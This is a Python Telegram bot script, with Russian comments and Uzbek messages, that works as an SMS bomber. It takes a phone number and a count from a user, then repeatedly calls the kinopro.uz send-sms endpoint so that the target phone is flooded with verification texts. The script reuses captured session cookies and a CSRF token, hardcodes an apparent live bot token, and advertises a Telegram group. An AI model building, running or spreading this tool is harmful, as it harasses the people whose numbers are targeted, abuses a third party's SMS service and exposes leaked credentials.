import requests
import telebot
import threading
import time

# Установка токена вашего Telegram бота
token = "7106642461:AAGsQLa7-saDi7q6yF_W2MbKR9rs7VmE1pg"
bot = telebot.TeleBot(token)

# URL для отправки SMS через kinopro.uz
url = 'https://kinopro.uz/ru/send-sms'

# Заголовки для отправки SMS
headers = {
    'Host': 'kinopro.uz',
    'Cookie': 'XSRF-TOKEN=eyJpdiI6IkFUeS9sYlhwQkluZko4RXk1L3Zrb0E9PSIsInZhbHVlIjoiWTk0cC9tRDNYYVh6T2xzb0tycENFa2JKZFRiVHE5dkRwZGExVUFta1BlRlVIQ3loT0t3TWpTeGs3RTlwV3pDRzVtVmNsSlJLV0FYWUI1YUxmN1UyaDIyTlpEZjVBM3JRSGRPSWpPZkRnbnZYRmRiVmowazZkSVc2bVVxeTVNN2oiLCJtYWMiOiJlMDQyYTBkZjc3ZDgzNDM0NzI0ZTYxZmNjOTU0MDE1MzQ1ODM2ZjcxMGI1MTdlMmMyMzA1NTIwZDUxNTdlNDFjIiwidGFnIjoiIn0%3D; kinoprouz_session=eyJpdiI6IithaWNLV3ZSMmVTM0JhcnVjTU9DaVE9PSIsInZhbHVlIjoiSXRuWmNMYVBFS25HMUR3TUhDUFBoTVJ4c3hIOWoxUk02ZklYampmZkFhcFF4WW9nZzRqVnkxZEl4S0ZsSlZWTzRScitlNGk0WENuU0ZiajlnNGZmOVdMazJzSkRZbVV4c1hMWThWZW9LdGhGalEvYUtnS1dUTnNtaGs2Y2oyL28iLCJtYWMiOiJmMjZkMmIwNDY4NjQ3NzQ5N2U4ZjUyNTllNmEzYzJiMTczMjgyOWI5YzdjZmViMmU3YzdlMWVlNWJmMDBhMzIxIiwidGFnIjoiIn0%3D; _ym_uid=1709140684508808736; _ym_d=1709140684; _ym_isad=2; _ym_visorc=w',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://kinopro.uz',
    'Referer': 'https://kinopro.uz/ru',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Te': 'trailers',
    'Connection': 'close'
}

# Словарь для отслеживания состояния отправки SMS для каждого пользователя
sending_sms = {}

# Функция для отправки SMS
def send_sms(phone_number, sms_count, chat_id):
    data = {
        '_token': 'u1VNfv3U4d8p1Pewi2PwdxK6Eepoom3cTAEaEb9T',  # Ваш токен здесь
        'username': f'998{phone_number}'
    }

    # Устанавливаем флаг отправки SMS для данного чата в True
    sending_sms[chat_id] = True

    total_sent_sms = 0
    sms_status_message = bot.send_message(chat_id, f"✅Yuborilgan SMS soni: {total_sent_sms}")

    for _ in range(sms_count):
        # Проверяем, не было ли отправки отменено пользователем
        if sending_sms.get(chat_id) == False:
            break

        if send_sms_request(data):
            total_sent_sms += 1
            bot.edit_message_text(f"♻️SMS yuborilmoqda... {total_sent_sms}\nSMS ni to'xtatish uchun /stop burig'ini bering.", chat_id=chat_id, message_id=sms_status_message.message_id)
            time.sleep(1)
        else:
            bot.send_message(chat_id, "❌Xatolik: SMS yuborilmadi.")
    
    # Устанавливаем флаг отправки SMS для данного чата обратно в False
    sending_sms[chat_id] = False
    bot.send_message(chat_id, f"📄Yuborilgan SMSlar soni: {total_sent_sms} ta✅\n\nBatafsil: <a href='t.me/+cCjXOEmdHv03Nzhh'>t.me/+cCjXOEmdHv03Nzhh</a>"'✅', parse_mode='HTML', disable_web_page_preview=True)

# Функция для выполнения запроса отправки SMS
def send_sms_request(data):
    response = requests.post(url, headers=headers, data=data)
    return response.ok

# Обработчик команды /start
@bot.message_handler(commands=["start"])
def start_message(message):
    bot.send_message(message.chat.id, "👋🏻Assalomu aleykum! Botdan foydalanish tartibi: nomer va sms soni (minimum 1, maksimum 50 ta sms) masalan: 901234567 10\n\nBatafsil: <a href='t.me/+cCjXOEmdHv03Nzhh'>t.me/+cCjXOEmdHv03Nzhh</a>"'✅', parse_mode='HTML', disable_web_page_preview=True)

# Обработчик сообщений
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "/stop":
        if sending_sms.get(message.chat.id) == True:
            # Отменяем отправку SMS, устанавливая флаг в False
            sending_sms[message.chat.id] = False
            bot.send_message(message.chat.id, "〽️SMS yuborish to'xtatildi.")
        else:
            bot.send_message(message.chat.id, "❌Sizda aktiv SMS yuborishlar yoq.")
    else:
        data = message.text.split()
        if len(data) == 2 and data[0].isdigit() and len(data[0]) <= 9 and data[1].isdigit():
            phone_number = data[0]
            sms_count = int(data[1])
            if 1 <= sms_count <= 20:
                # Проверяем, не идет ли уже отправка SMS для данного чата
                if sending_sms.get(message.chat.id) == True:
                    bot.send_message(message.chat.id, "❌SMS yuborishi allaqachon boshlangan.")
                else:
                    # Запускаем поток для отправки SMS
                    threading.Thread(target=send_sms, args=(phone_number, sms_count, message.chat.id)).start()
            else:
                bot.send_message(message.chat.id, "⚠️Noto'g'ri format. Botdan foydalanish tartibi: nomer va sms soni (minimum 1, maksimum 20 ta sms) masalan: 901234567 10")
        else:
            bot.send_message(message.chat.id, "⚠️Noto'g'ri format. Botdan foydalanish tartibi: nomer va sms soni (minimum 1, maksimum 20 ta sms) masalan: 901234567 10")

# Запуск бота
bot.polling()
